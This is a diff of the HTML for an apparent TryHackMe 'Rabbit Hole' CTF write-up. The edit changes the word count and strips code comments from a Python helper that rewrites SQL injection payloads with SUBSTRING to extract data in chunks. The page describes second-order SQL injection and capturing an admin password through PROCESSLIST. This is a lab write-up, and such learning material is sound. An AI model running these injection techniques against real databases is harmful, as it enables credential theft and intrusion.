@@ -39,7 +39,7 @@
 <meta itemprop="name" content="THM: Rabbit Hole">
 <meta itemprop="description" content="Platform: TryHackMe Link: Rabbit Hole Level: Hard OS: Linux Rabbit Hole is all about exploiting SQL injection. We discover a second-order SQL injection vulnerability after some failed Cross-Site scripting (XSS) attempts. Using this, we retrieve some password hashes, but they don’t lead to initial access. By combining a python script and a payload leveraging the PROCESSLIST command we successfully extract the query containing the admin user password which we use to login via SSH and read the flag."><meta itemprop="datePublished" content="2024-10-29T19:25:05-05:00" />
 <meta itemprop="dateModified" content="2024-10-29T19:25:05-05:00" />
-<meta itemprop="wordCount" content="1811"><meta itemprop="image" content="https://scorpiosec.com/images/THM-RabbitHole/RabbitHole.png" />
+<meta itemprop="wordCount" content="1763"><meta itemprop="image" content="https://scorpiosec.com/images/THM-RabbitHole/RabbitHole.png" />
 <meta itemprop="keywords" content="TryHackMe," />
 <meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:image" content="https://scorpiosec.com/images/THM-RabbitHole/RabbitHole.png" /><meta name="twitter:title" content="THM: Rabbit Hole"/>
@@ -360,7 +360,6 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>    soup <span style="color:#f92672">=</span> BeautifulSoup(html, <span style="color:#e6db74">&#39;html.parser&#39;</span>)
 </span></span><span style="display:flex;"><span>    results <span style="color:#f92672">=</span> []
 </span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Find all table cells</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> td <span style="color:#f92672">in</span> soup<span style="color:#f92672">.</span>find_all(<span style="color:#e6db74">&#39;td&#39;</span>):
 </span></span><span style="display:flex;"><span>        content <span style="color:#f92672">=</span> td<span style="color:#f92672">.</span>get_text()<span style="color:#f92672">.</span>strip()
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Filter out timestamp entries (they start with year)</span>
@@ -370,21 +369,17 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> results
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">modify_payload</span>(payload, substring_range):
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Find the SELECT and FROM positions</span>
 </span></span><span style="display:flex;"><span>    select_pos <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>upper()<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;SELECT&#39;</span>)
 </span></span><span style="display:flex;"><span>    from_pos <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>upper()<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;FROM&#39;</span>)
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> select_pos <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">or</span> from_pos <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> payload
 </span></span><span style="display:flex;"><span>        
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Extract the parts of the query</span>
 </span></span><span style="display:flex;"><span>    select_clause <span style="color:#f92672">=</span> payload[select_pos:from_pos]
 </span></span><span style="display:flex;"><span>    rest_of_query <span style="color:#f92672">=</span> payload[from_pos:]
 </span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Split the selected columns</span>
 </span></span><span style="display:flex;"><span>    columns <span style="color:#f92672">=</span> select_clause<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;SELECT&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;,&#39;</span>)
 </span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Modify the last column to use SUBSTRING</span>
 </span></span><span style="display:flex;"><span>    modified_columns <span style="color:#f92672">=</span> []
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i, col <span style="color:#f92672">in</span> enumerate(columns):
 </span></span><span style="display:flex;"><span>        col <span style="color:#f92672">=</span> col<span style="color:#f92672">.</span>strip()
@@ -395,7 +390,6 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>                col <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;SUBSTRING(</span><span style="color:#e6db74">{</span>col<span style="color:#e6db74">}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{</span>substring_range[<span style="color:#ae81ff">0</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{</span>substring_range[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span>
 </span></span><span style="display:flex;"><span>        modified_columns<span style="color:#f92672">.</span>append(col)
 </span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Reconstruct the query</span>
 </span></span><span style="display:flex;"><span>    modified_payload <span style="color:#f92672">=</span> payload[:select_pos] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;SELECT &#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;, &#39;</span><span style="color:#f92672">.</span>join(modified_columns) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> rest_of_query
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> modified_payload
 </span></span><span style="display:flex;"><span>
@@ -407,7 +401,6 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>    ip <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
 </span></span><span style="display:flex;"><span>    original_payload <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]
 </span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Create two payloads: one for first 16 chars, one for the rest</span>
 </span></span><span style="display:flex;"><span>    first_payload <span style="color:#f92672">=</span> modify_payload(original_payload, (<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">16</span>))
 </span></span><span style="display:flex;"><span>    second_payload <span style="color:#f92672">=</span> modify_payload(original_payload, (<span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">32</span>))
 </span></span><span style="display:flex;"><span>
@@ -457,7 +450,7 @@ de97e75e5b4604526a2afaed5f5439d7
 . I was not able to make the link between the automated logins and the database itself.</p>
 </blockquote>
 <p>At this point we have exhausted a lot of options, but there is more to explore. Remember how we had noticed that the admin user was logging in <strong>every minute</strong>, it obviously points to some sort of automation.</p>
-<p>It turns out that we can make use of the <code>PROCESSLIST</code> to see which queries are being made in the background and if our timing is right, the admin password will be exposed. <em>Read more about <code>PROCESSLIST</code> <a href="https://mariadb.com/kb/en/information-schema-processlist-table/" target="_blank" >here</a>
+<p>It turns out that we can make use of the <code>PROCESSLIST</code> command to see which queries are being made in the background and if our timing is right, the admin password will be exposed. <em>Read more about <code>PROCESSLIST</code> <a href="https://mariadb.com/kb/en/information-schema-processlist-table/" target="_blank" >here</a>
 
 .</em></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
@@ -558,7 +551,7 @@ de97e75e5b4604526a2afaed5f5439d7
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        1811 Words
+        1763 Words
       </p>
 
       <p>
